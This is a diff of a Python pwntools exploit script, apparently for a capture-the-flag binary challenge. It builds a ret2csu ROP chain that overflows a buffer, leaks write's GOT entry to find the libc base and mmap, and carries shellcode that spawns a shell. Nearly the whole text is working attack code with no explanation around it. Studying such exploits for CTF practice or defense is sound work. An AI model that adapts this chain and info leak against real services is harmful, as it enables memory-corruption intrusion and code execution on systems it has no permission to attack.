@@ -29,7 +29,6 @@ POP_RBX = 0x4006AA
 MOV_RDX_R13 = 0x400690
 SHELL_CODE = asm(shellcraft.sh())
 P_DL_RESOLVE = 0x600A50
-LIBC_DL_RESOLVE = 0x7f1b04e99a40 - 0x7f1b048b8000
 LIBC_POP_RAX_RET = 0x000487a7  # : pop rax ; ret  ;
 
 from typing import Tuple
@@ -43,8 +42,8 @@ def exp_x64_csu_init(
     """
     仅适用于：
         1. 三个参数以内函数
-        2. 溢出空间较大（> 128 bytes）
-        3. 第一个参数较小（< 4 bytes），例如write和read等
+        2. 溢出空间较大（>= 128 bytes）
+        3. 第一个参数较小（<= 4 bytes），例如write和read，以及某些情况下的mprotect
     """
     import struct
     return b"".join([
@@ -81,16 +80,34 @@ def main():
             MOV_RDX_R13,
             elf.sym["_start"],
             elf.got["write"],
+            (1, elf.got["write"], 6)
+        ),
+    ))
+    io.sendafter(":\n", payload)
+    write_addr = u64(io.recv(6).ljust(8, b"\0"))
+    log.success("write_addr = 0x%x", write_addr)
+    libc.address = write_addr - libc.sym["write"]
+    log.success("libc_base = 0x%x", libc.address)
+    mmap_addr = libc.sym["mmap"]
+    log.success("mmap_addr = 0x%x", mmap_addr)
+
+    pause()
+
+    payload = flat((
+        PADDING,
+        exp_x64_csu_init(
+            POP_RBX,
+            MOV_RDX_R13,
+            elf.sym["_start"],
+            elf.got["write"],
             (1, P_DL_RESOLVE, 6)
         ),
     ))
     io.sendafter(":\n", payload)
     dl_resolve_addr = u64(io.recv(6).ljust(8, b"\0"))
     log.success("dl_resolve_addr = 0x%x", dl_resolve_addr)
-    libc.address = dl_resolve_addr - LIBC_DL_RESOLVE
-    log.success("libc_base = 0x%x", libc.address)
-    mmap_addr = libc.sym["mmap"]
-    log.success("mmap_addr = 0x%x", mmap_addr)
+
+    pause()
 
     target_addr = 0x1000000
     payload = flat((
